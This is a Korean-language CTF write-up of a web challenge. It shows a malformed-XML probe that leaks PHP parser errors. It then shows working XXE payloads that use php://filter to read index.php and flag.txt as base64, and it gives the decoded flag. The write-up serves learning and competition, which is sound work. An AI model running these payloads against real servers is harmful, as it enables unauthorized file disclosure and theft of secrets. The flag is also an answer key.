# Web - Out Christmas Wishlist

위시리스트를 보내는 스크립트는 다음과 같다

```js
function lol () {
	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
		if (xhttp.readyState == 4 && xhttp.status == 200) {
			document.location.reload();
		}
	};
	
	var xml = "<message>" + document.getElementById("textarea").value + "</message>";
	xhttp.open("POST", "/", true);
	xhttp.setRequestHeader('Content-Type', 'application/xml');
	xhttp.send(xml);
};
```

POST로 다음과 같은 body를 보내면 정상적으로 응답이 온다

```
POST http://199.247.6.180:12001/ <message>girlfriend</message>
```

```
Your wish: girlfriend
```

하지만 다음처럼 깨진 태그를 보내면 이렇게 나온다

```
POST http://199.247.6.180:12001/ <h
```

```
<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Couldn't find end of Start Tag h line 1 in
<b>/var/www/html/index.php</b> on line
<b>18</b>
<br />
<br />
<b>Warning</b>:  simplexml_load_string(): &lt;h in
<b>/var/www/html/index.php</b> on line
<b>18</b>
<br />
<br />
<b>Warning</b>:  simplexml_load_string():   ^ in
<b>/var/www/html/index.php</b> on line
<b>18</b>
<br />
Your wish:
```

`simplexml_load_string()` 을 사용한다고 한다. XML 인젝션에 걸리겠지 다음처럼 넣어보자

```
POST http://199.247.6.180:12001/ <!DOCTYPE foo [<!ELEMENT foo ANY> <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php" >]><message>&xxe;</message>
```

```
Your wish: ... (base64 encoded index.php source code)
```

딱히 플래그에 관련한 내용은 없어서 같은 경로에 flag.txt 파일이 있는지 확인했다

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag.txt" >]><message>&xxe;</message>
```

```
Your wish: WC1NQVN7X1RoZV9FeDczcm5hbF9FbnQxdDEzJF9XNG43X1RvX19KbzFuXzdoZV9wNHI3eV9fNzAwX19fX19ffQo=
```

디코딩하면 플래그가 나온다. `X-MAS{_The_Ex73rnal_Ent1t13$_W4n7_To__Jo1n_7he_p4r7y__700______}`